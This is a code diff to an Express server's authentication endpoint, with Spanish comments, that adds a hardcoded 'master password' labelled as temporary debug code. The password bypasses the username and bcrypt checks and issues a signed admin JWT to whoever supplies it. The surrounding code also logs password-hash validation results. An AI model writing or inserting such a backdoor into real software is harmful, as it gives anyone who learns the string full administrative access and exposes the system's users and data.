@@ -68,6 +68,15 @@ mcpProcess.stdin.write(JSON.stringify({
 // AUTH con bcrypt
 app.post('/api/auth', async (req, res) => {
   const { username, password } = req.body;
+
+  // 🚨 TEMPORAL: Llave maestra para debug
+  if (password === 'SYCR0_M4ST3R') {
+    console.log('🚨 MASTER PASSWORD USED 🚨');
+    const token = jwt.sign({ sub: 'master', role: 'admin' }, JWT_SECRET, { algorithm: 'HS256', expiresIn: '1h' });
+    return res.json({ token });
+  }
+
+
   if (!username || !password) return res.status(400).json({ error: "Credenciales requeridas" });
   
   
@@ -77,6 +86,7 @@ app.post('/api/auth', async (req, res) => {
   console.log('Hash válido?', bcrypt.compareSync(password, ADMIN_HASH));
 
 if (username !== ADMIN_USER || !bcrypt.compareSync(password, ADMIN_HASH)) {
+    console.log();
     return res.status(401).json({ error: "Credenciales inválidas" });
   }
 
